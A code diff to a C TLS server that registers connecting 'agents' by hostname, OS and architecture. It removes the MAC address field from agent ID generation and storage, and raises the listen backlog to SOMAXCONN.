@@ -47,14 +47,12 @@ void init() {
     ERR_load_crypto_strings();
 }
 void ssl_register_agent(cJSON *json, char* ip, SSL *ssl) {
-
-    cJSON *mac = cJSON_GetObjectItem(json, "mac");
     cJSON *hostname =  cJSON_GetObjectItem(json, "hostname");
     cJSON *os =  cJSON_GetObjectItem(json, "os");
     cJSON *arch = cJSON_GetObjectItem(json, "arch");
 
     char input[255];
-    snprintf(input, sizeof(input), "%s-%s-%s-%s", mac->valuestring, hostname->valuestring, os->valuestring, arch->valuestring);
+    snprintf(input, sizeof(input), "%s-%s-%s", hostname->valuestring, os->valuestring, arch->valuestring);
     char agent_id[65];
     GenerateID(input, agent_id);
 
@@ -73,8 +71,6 @@ void ssl_register_agent(cJSON *json, char* ip, SSL *ssl) {
     args.os[sizeof(args.os) - 1] = '\0';
     strncpy(args.ip, ip, sizeof(args.ip) - 1);
     args.ip[sizeof(args.ip) - 1] = '\0';
-    strncpy(args.mac, mac->valuestring, sizeof(args.mac) - 1);
-    args.mac[sizeof(args.mac) - 1] = '\0';
     strncpy(args.hostname, hostname->valuestring, sizeof(args.hostname) - 1);
     args.hostname[sizeof(args.hostname) - 1] = '\0';
 
@@ -160,7 +156,6 @@ void* tcp_ssl_listener(void *args) {
     }
     free(args);
     
-
     int serverSock, agentSock;
 
     struct sockaddr_in client_addr;
@@ -185,7 +180,7 @@ void* tcp_ssl_listener(void *args) {
         return NULL;
     }
 
-    if (listen(serverSock, 20) == -1) {
+    if (listen(serverSock, SOMAXCONN) == -1) {
         perror("Listen Failed");
         close(serverSock);
         sleep(60);
